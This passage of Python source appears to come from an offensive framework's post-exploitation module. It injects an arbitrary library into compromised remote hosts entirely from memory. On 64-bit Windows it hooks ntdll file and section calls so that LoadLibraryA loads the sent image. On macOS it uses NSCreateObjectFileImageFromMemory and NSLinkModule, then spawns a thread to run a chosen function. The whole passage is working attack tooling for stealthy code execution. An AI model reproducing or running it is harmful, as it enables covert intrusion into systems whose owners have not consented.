                VirtualFree(hook_NtMapViewOfSection, 0, MEM_RELEASE);
                LocalFree(BUFFER);
                VirtualFree(DATA_PTR, 0, MEM_RELEASE);
                sendint(-1);
                return;
            } else {
                sendint(1);
                readdatafromself(hook_NtClose, i);
            }

            DATA->library_len   = NAME_LEN;
            DATA->library_name  = NAME;
            DATA->size_of_image = nt_h->SizeOfImage;

            // Install exception handler
            exc = RtlAddVectoredExceptionHandler(1, exception_handler);

            // Install hooks
            hook_function(DATA->NtOpenFile, hook_NtOpenFile, DATA->NtOpenFile_code);
            hook_function(DATA->NtOpenSection, hook_NtOpenSection, DATA->NtOpenSection_code);
            hook_function(DATA->NtCreateSection, hook_NtCreateSection, DATA->NtCreateSection_code);
            hook_function(DATA->NtQueryAttributesFile, hook_NtQueryAttributesFile, DATA->NtQueryAttributesFile_code);
            hook_function(DATA->NtMapViewOfSection, hook_NtMapViewOfSection, DATA->NtMapViewOfSection_code);
            hook_function(DATA->NtClose, hook_NtClose, DATA->NtClose_code);

            DATA->NtOpenFile_tramp = DATA->NtOpenFile_code;
            DATA->NtOpenSection_tramp = DATA->NtOpenSection_code;
            DATA->NtCreateSection_tramp = DATA->NtCreateSection_code;
            DATA->NtQueryAttributesFile_tramp = DATA->NtQueryAttributesFile_code;
            DATA->NtMapViewOfSection_tramp = DATA->NtMapViewOfSection_code;
            DATA->NtClose_tramp = DATA->NtClose_code;

            address = LoadLibraryA(NAME);
            sendlonglong(address);

            if (exc != 0) {
                RtlRemoveVectoredExceptionHandler(exc);
            }

            unhook_function(DATA->NtOpenFile, DATA->NtOpenFile_code);
            unhook_function(DATA->NtOpenSection, DATA->NtOpenSection_code);
            unhook_function(DATA->NtCreateSection, DATA->NtCreateSection_code);
            unhook_function(DATA->NtQueryAttributesFile, DATA->NtQueryAttributesFile_code);
            unhook_function(DATA->NtMapViewOfSection, DATA->NtMapViewOfSection_code);
            unhook_function(DATA->NtClose, DATA->NtClose_code);

            if (address == 0) {
                VirtualFree(DATA->library_base, 0, MEM_RELEASE);
            }

            VirtualFree(DATA_PTR, 0, MEM_RELEASE);
            LocalFree(BUFFER);

            VirtualFree(hook_NtOpenFile, 0, MEM_RELEASE);
            VirtualFree(hook_NtOpenSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtCreateSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtQueryAttributesFile, 0, MEM_RELEASE);
            VirtualFree(hook_NtMapViewOfSection, 0, MEM_RELEASE);
            VirtualFree(hook_NtClose, 0, MEM_RELEASE);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)

        ret = node.shell.readlonglong()

        if ret == 0:
            self.log('Could not find NTDLL base')
            node.shell.leave()
            return 0

        self.log('NTDLL base: 0x%x' % ret)

        for i in ('NtOpenFile', 'NtOpenSection', 'NtCreateSection',
                  'NtQueryAttributesFile', 'NtMapViewOfSection',
                  'NtClose', 'RtlUnicodeStringToAnsiString',
                  'RtlFreeAnsiString'):
            ret = node.shell.readlonglong()

            if ret == 0:
                self.log('Could not resolve ntdll!%s' % i)
                node.shell.leave()
                return 0
            else:
                self.log('ntdll!%s @ 0x%x' % (i, ret))


        self.log('Sending dynamic library, %d bytes..' % len(data))
        node.shell.sendint(len(data))

        if node.shell.readint(signed=True) == -1:
            self.log('Could not allocate memory for library at remote side')
            node.shell.leave()
            return 0

        node.shell.writebuf(data)

        # Check if mapping succeeded
        ret = node.shell.readint(signed=True)

        if ret != 1:
            if ret == -2:
                self.log('Not a Windows PE file')
            elif ret == -3:
                self.log('Not a DLL')
            elif ret == -4:
                self.log('Not a 64bit AMD64 DLL')
            elif ret == -5:
                self.log('Could not allocate memory for library mapping')
            elif ret == -6:
                self.log('Error while mapping library')
            elif ret == -7:
                self.log('Error while mapping sections')
            else:
                self.log('Unknown error')

            node.shell.leave()
            return 0

        # Send exception handler
        node.shell.sendint(len(exception_handler))
        ret = node.shell.readint(signed=True)

        if ret == -1:
            self.log('Error allocating memory for exception handler')
            node.shell.leave()
            return 0

        node.shell.writebuf(exception_handler)

        # Send hooks
        self.log('Sending hooks..')

        for (hook, desc) in [(hook_NtOpenFile, 'NtOpenFile'),
                             (hook_NtOpenSection, 'NtOpenSection'),
                             (hook_NtCreateSection, 'NtCreateSection'),
                             (hook_NtQueryAttributesFile, 'NtQueryAttributesFile'),
                             (hook_NtMapViewOfSection, 'NtMapViewOfSection'),
                             (hook_NtClose, 'NtClose')]:

            node.shell.sendint(len(hook))
            ret = node.shell.readint(signed=True)

            if ret == -1:
                self.log('Error while allocating memory for hook %s' % desc)
                node.shell.leave()
                return 0

            self.log('[+] %s' % desc)
            node.shell.writebuf(hook)

        ret = node.shell.readlonglong()
        self.log('LoadLibraryA() = 0x%x' % ret)
        node.shell.leave()

        if ret and self.callfunction:
            code = """
            #import "local", "sendlonglong" as "sendlonglong"
            #import "local", "kernel32.dll|CreateThread" as "CreateThread"
            #import "remote", "%s|%s" as "INITF"

            void main()
            {
                void *handle;

                handle = CreateThread(NULL, 0, INITF, NULL, 0, NULL);
                sendlonglong(handle);
            }
            """ % (name, self.callfunction)

            try:
                node.shell.clearfunctioncache()
                request = node.shell.compile(code, {})
                node.shell.sendrequest(request)

                if node.shell.readlonglong() != 0:
                    self.log('Started new thread to execute %s()' % self.callfunction)
                else:
                    self.log('Error when calling CreateThread')

                node.shell.leave()
            except Exception, ex:
                self.log('Error: %s' % ex)
                self.log('Could not execute %s()' % self.callfunction)

        return ret


    def inject_osx32(self, node, data, name):

        # First, check to see if library is already loaded under given name.
        # If so, we will get a reference and return that
        code = """
        #import "remote", "_dlopen" as "_dlopen"
        #import "local", "sendpointer" as "sendpointer"

        #import "string", "NAME" as "NAME"

        #define RTLD_GLOBAL 0x8
        #define RTLD_LAZY   0x1

        void main()
        {
            void *ret;

            ret = _dlopen(NAME, RTLD_GLOBAL|RTLD_LAZY);
            sendpointer(ret);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {'NAME' : name})
        node.shell.sendrequest(request)
        ret = node.shell.readpointer()
        node.shell.leave()

        if ret != 0:
            self.log('Library %s already loaded at 0x%x' % (name, ret))
            return ret

        vars = {
            'FD'         : node.shell.fd,
            'NAME'       : name,
            'BUFFER_LEN' : len(data)
        }

        code = """
        #import "remote", "malloc" as "malloc"
        #import "remote", "free" as "free"

        #import "remote", "NSCreateObjectFileImageFromMemory" as "NSCreateObjectFileImageFromMemory"
        #import "remote", "NSLinkModule" as "NSLinkModule"

        #import "local", "sendint" as "sendint"
        #import "local", "sendpointer" as "sendpointer"
        #import "local", "readblock" as "readblock"

        #import "string", "NAME" as "NAME"
        #import "int", "BUFFER_LEN" as "BUFFER_LEN"
        #import "int", "FD" as "FD"

        #define MH_BUNDLE 0x8
        #define MH_DYLIB 0x6
        #define FAT_CIGAM 0xbebafeca
        #define MH_MAGIC_32 0xfeedface
        #define CPU_TYPE_X86 7

        struct FAT_HEADER
        {
            int magic;
            int nfat_arch;
        };

        struct FAT_ARCH
        {
            int cputype;
            int cpusubtype;
            int offset;
            int size;
            int align;
        };

        struct MACH_HEADER_CHUNK
        {
            int magic;
            int cputype;
            int cpusubtype;
            int filetype;
        };

        int bswap_16(int value)
        {
            int ret;

            ret = value & 0xff;
            ret = ret << 8;

            value = value >> 8;
            ret = ret | value;

            return ret;
        }

        int bswap_32(int value)
        {
            int ret;
            int k;

            k = value & 0xffff;

            ret = bswap_16(k);
            ret = ret << 16;

            k = value >> 16;
            ret = ret | bswap_16(k);

            return ret;
        }


        void main()
        {
            void *buf;
            void *data;
            char *c;
            int *i;
            int length;
            int l;
            int n;
            int k;
            void *image;
            void *handle;

            struct MACH_HEADER_CHUNK *mh;
            struct FAT_HEADER *fh;
            struct FAT_ARCH *fa;

            buf = malloc(BUFFER_LEN);

            sendpointer(buf);

            if (buf == 0) {
                return;
            }

            readblock(FD, buf, BUFFER_LEN);
            i = buf;
            data = 0;

            if (*i == MH_MAGIC_32) {
                mh = buf;

                if (mh->cputype != CPU_TYPE_X86) {
                    free(buf);
                    sendint(-1);
                    return;
                }
                data = buf;
                length = BUFFER_LEN;
                sendint(1);
            } else {
                // Universal binary check
                if (*i != FAT_CIGAM) {
                    free(buf);
                    sendint(-2);
                    return;
                }

                fh = buf;

                // Parse universal binary
                n = bswap_32(fh->nfat_arch);

                c = buf;
                c = c + 8;

                fa = c;

                l = 0;
                k = 0;

                do {
                    if (bswap_32(fa->cputype) == CPU_TYPE_X86) {
                        c = buf;
                        c = c + bswap_32(fa->offset);
                        data = c;
                        length = bswap_32(fa->size);
                        k = 1;
                    }

                    l = l + 1;

                    if (l == n) {
                        k = 1;
                    }

                    c = fa;
                    c = c + 20;
                    fa = c;
                } while (k == 0);

                if (data == 0) {
                    free(buf);
                    sendint(-3);
                    return;
                }

                mh = data;
                sendint(1);
            }

            // DYLIB/BUNDLE check
            if (mh->filetype != MH_BUNDLE) {
                if (mh->filetype != MH_DYLIB) {
                    free(buf);
                    sendint(-4);
                    return;
                }
            }

            // This is needed in order to force DYLD to load the file from memory
            if (mh->filetype != MH_BUNDLE) {
                mh->filetype = MH_BUNDLE;
            }

            l = NSCreateObjectFileImageFromMemory(mh, length, &image);

            if (l != 1) {
                free(buf);
                sendint(-5);
                return;
            }

            handle = NSLinkModule(image, NAME, 0);

            if (handle == 0) {
                free(buf);
                sendint(-6);
                return;
            }

            sendint(1);
            sendpointer(handle);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)
        ret = node.shell.readpointer()

        if ret == 0:
            self.log('Could not allocate memory for library.')
            node.shell.leave()
            return 0

        self.log('Allocated %d bytes at 0x%x' % (len(data), ret))
        node.shell.writebuf(data)

        ret = node.shell.readint(signed=True)

        if ret != 1:
            node.shell.leave()

            if ret == -1:
                self.log('Mach-O CPU_TYPE != X86')
            elif ret == -2:
                self.log('Not a Mach-O file')
            elif ret == -3:
                self.log('Could not find CPU_TYPE_X86 Mach-O file, aborting')
            else:
                self.log('Unknown error: %d' % ret)

            return 0

        ret = node.shell.readint(signed=True)

        if ret != 1:
            node.shell.leave()

            if ret == -4:
                self.log('Filetype not in (MH_BUNDLE, MH_DYLIB)')
            elif ret == -5:
                self.log('NSCreateObjectFileImageFromMemory failure')
            elif ret == -6:
                self.log('NSLinkModule failure')
            else:
                self.log('Unknown error: %d' % ret)

            return 0

        ret = node.shell.readpointer()
        node.shell.leave()

        if self.callfunction:
            code = """
            #import "local", "sendint" as "sendint"
            #import "remote", "%s|%s" as "INITF"
            #import "remote", "libpthread.dylib|pthread_create" as "pthread_create"

            void main()
            {
                int ret;
                void *pthread_t;

                ret = pthread_create(&pthread_t, NULL, INITF, NULL);
                sendint(ret);
            }
            """ % (name, self.callfunction)

            try:
                node.shell.clearfunctioncache()
                request = node.shell.compile(code, {})
                node.shell.sendrequest(request)

                if node.shell.readint() == 0:
                    self.log('Started new thread to execute %s()' % self.callfunction)
                else:
                    self.log('Error when calling pthread_create()')

                node.shell.leave()
            except ResolveException, ex:
                self.log('Error: %s' % ex)

        return ret

    def inject_osx64(self, node, data, name):
        # First, check to see if library is already loaded under given name.
        # If so, we will get a reference and return that
        code = """
        #import "remote64", "_dlopen" as "_dlopen"

        #import "local", "sendpointer" as "sendpointer"
        #import "string", "NAME" as "NAME"

        #define RTLD_GLOBAL 0x8
        #define RTLD_LAZY   0x1

        void main()
        {
            void *ret;

            ret = _dlopen(NAME, RTLD_GLOBAL|RTLD_LAZY);
            sendpointer(ret);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, {'NAME' : name})
        node.shell.sendrequest(request)
        ret = node.shell.readpointer()
        node.shell.leave()

        if ret != 0:
            self.log('Library %s already loaded at 0x%x' % (name, ret))
            return ret

        vars = {
            'FD'         : node.shell.fd,
            'NAME'       : name,
            'BUFFER_LEN' : len(data)
        }

        code = """
        #import "remote64", "malloc" as "malloc"
        #import "remote64", "free" as "free"

        #import "remote64", "NSCreateObjectFileImageFromMemory" as "NSCreateObjectFileImageFromMemory"
        #import "remote64", "NSLinkModule" as "NSLinkModule"


        #import "local", "sendint" as "sendint"
        #import "local", "sendpointer" as "sendpointer"
        #import "local", "readblock" as "readblock"

        #import "string", "NAME" as "NAME"
        #import "int", "BUFFER_LEN" as "BUFFER_LEN"
        #import "int", "FD" as "FD"

        #define MH_BUNDLE       0x8
        #define MH_DYLIB        0x6
        #define FAT_CIGAM       0xbebafeca
        #define MH_MAGIC_64     0xfeedfacf
        #define CPU_TYPE_X86_64 0x01000007

        struct FAT_HEADER
        {
            int magic;
            int nfat_arch;
        };

        struct FAT_ARCH
        {
            int cputype;
            int cpusubtype;
            int offset;
            int size;
            int align;
        };

        struct MACH_HEADER_CHUNK
        {
            int magic;
            int cputype;
            int cpusubtype;
            int filetype;
        };

        int bswap_16(int value)
        {
            int ret;

            ret = value & 0xff;
            ret = ret << 8;

            value = value >> 8;
            ret = ret | value;

            return ret;
        }

        int bswap_32(int value)
        {
            int ret;
            int k;

            k = value & 0xffff;

            ret = bswap_16(k);
            ret = ret << 16;

            k = value >> 16;
            ret = ret | bswap_16(k);

            return ret;
        }


        void main()
        {
            void *buf;
            void *data;
            char *c;
            int *i;
            int length;
            int l;
            int n;
            int k;
            void *image;
            void *handle;

            struct MACH_HEADER_CHUNK *mh;
            struct FAT_HEADER *fh;
            struct FAT_ARCH *fa;

            buf = malloc(BUFFER_LEN);

            sendpointer(buf);

            if (buf == 0) {
                return;
            }

            readblock(FD, buf, BUFFER_LEN);
            i = buf;
            data = 0;

            if (*i == MH_MAGIC_64) {
                mh = buf;

                if (mh->cputype != CPU_TYPE_X86_64) {
                    free(buf);
                    sendint(-1);
                    return;
                }
                data = buf;
                length = BUFFER_LEN;
                sendint(1);
            } else {
                // Universal binary check
                if (*i != FAT_CIGAM) {
                    free(buf);
                    sendint(-2);
                    return;
                }

                fh = buf;

                // Parse universal binary
                n = bswap_32(fh->nfat_arch);

                c = buf;
                c = c + 8;

                fa = c;

                l = 0;
                k = 0;

                do {
                    if (bswap_32(fa->cputype) == CPU_TYPE_X86_64) {
                        c = buf;
                        c = c + bswap_32(fa->offset);
                        data = c;
                        length = bswap_32(fa->size);
                        k = 1;
                    }

                    l = l + 1;

                    if (l == n) {
                        k = 1;
                    }

                    c = fa;
                    c = c + 20;
                    fa = c;
                } while (k == 0);

                if (data == 0) {
                    free(buf);
                    sendint(-3);
                    return;
                }

                mh = data;
                sendint(1);
            }

            // DYLIB/BUNDLE check
            if (mh->filetype != MH_BUNDLE) {
                if (mh->filetype != MH_DYLIB) {
                    free(buf);
                    sendint(-4);
                    return;
                }
            }

            // This is needed in order to force DYLD to load the file from memory
            if (mh->filetype != MH_BUNDLE) {
                mh->filetype = MH_BUNDLE;
            }

            l = NSCreateObjectFileImageFromMemory(mh, length, &image);

            if (l != 1) {
                free(buf);
                sendint(-5);
                return;
            }

            handle = NSLinkModule(image, NAME, 0);

            if (handle == 0) {
                free(buf);
                sendint(-6);
                return;
            }

            sendint(1);
            sendpointer(handle);
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)
        ret = node.shell.readpointer()

        if ret == 0:
            self.log('Could not allocate memory for library.')
            node.shell.leave()
            return 0

        self.log('Allocated %d bytes at 0x%x' % (len(data), ret))
        node.shell.writebuf(data)

        ret = node.shell.readint(signed=True)

        if ret != 1:
            node.shell.leave()

            if ret == -1:
                self.log('Mach-O CPU_TYPE != X86_64')
            elif ret == -2:
                self.log('Not a Mach-O file')
            elif ret == -3:
                self.log('Could not find CPU_TYPE_X86_64 Mach-O file, aborting')
            else:
                self.log('Unknown error: %d' % ret)

            return 0

        ret = node.shell.readint(signed=True)

        if ret != 1:
            node.shell.leave()

            if ret == -4:
                self.log('Filetype not in (MH_BUNDLE, MH_DYLIB)')
            elif ret == -5:
                self.log('NSCreateObjectFileImageFromMemory failure')
            elif ret == -6:
                self.log('NSLinkModule failure')
            else:
                self.log('Unknown error: %d' % ret)

            return 0

        ret = node.shell.readpointer()
        node.shell.leave()

        if self.callfunction:
            code = """
            #import "local", "sendint" as "sendint"
            #import "remote64", "%s|%s" as "INITF"
            #import "remote64", "libpthread.dylib|pthread_create" as "pthread_create"

            void main()
            {
                int ret;
                void *pthread_t;

                ret = pthread_create(&pthread_t, NULL, INITF, NULL);
                sendint(ret);
            }
            """ % (name, self.callfunction)

            try:
                node.shell.clearfunctioncache()
                request = node.shell.compile(code, {})
                node.shell.sendrequest(request)

                if node.shell.readint() == 0:
                    self.log('Started new thread to execute %s()' % self.callfunction)
                else:
                    self.log('Error when calling pthread_create()')

                node.shell.leave()
            except ResolveException, ex:
                self.log('Error: %s' % ex)

        return ret

    def inject(self, node, data, name):
        nodetype = node.nodetype

        if nodetype == 'win32Node':
            return self.inject_win32(node, data, name)
        elif nodetype == 'win64Node':
            return self.inject_win64(node, data, name)
        elif nodetype == 'osxNode' and isinstance(node.shell, OSX_x86):
            return self.inject_osx32(node, data, name)
        elif nodetype == 'osxNode' and isinstance(node.shell, OSX_x64):
            return self.inject_osx64(node, data, name)
        else:
            self.log('Node of type %s not supported' % nodetype)
            return 0


    def run(self):
        self.setInfo("%s (in progress)" % NAME)
        self.getArgs()

        if self.srcfile is None:
            self.log("Please enter a source library to inject.")
            self.setInfo("%s - done (failed)" % NAME)
            return 0

        try:
            data = open(self.srcfile, 'rb').read()
            name = os.path.split(os.path.abspath(self.srcfile))[-1]
        except Exception:
            self.log('Error reading data from %s' % self.srcfile)
            self.setInfo('%s - done (failed)' % NAME)
            return 0

        result = []

        for node in self.argsDict["passednodes"]:
            nodetype     = node.nodetype

            if (nodetype in ['win32Node', 'win64Node']) or \
               (nodetype == 'osxNode' and (isinstance(node.shell, OSX_x86) or
                                           isinstance(node.shell, OSX_x64))):

                self.log('Injecting %d bytes from %s as %s' % (len(data), self.srcfile, name))

                try:
                    ret = self.inject(node, data, name)
                except Exception, ex:
                    self.log('Exception: %s' % ex)
                    ret = 0

                result.append(ret)

                if ret != 0:
                    self.log("Library injected and loaded at: 0x%x" % ret)
                else:
                    self.log("Failed to inject library on remote host.")
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command." % (node.get_name(), nodetype))
                result.append(0)

        self.setInfo("%s - done" % (NAME))

        if any(result):
            self.setInfo("%s - done (Success!)" % NAME)
            return 1
        else:
            self.setInfo("%s - done (failed)" % NAME)
            return 0
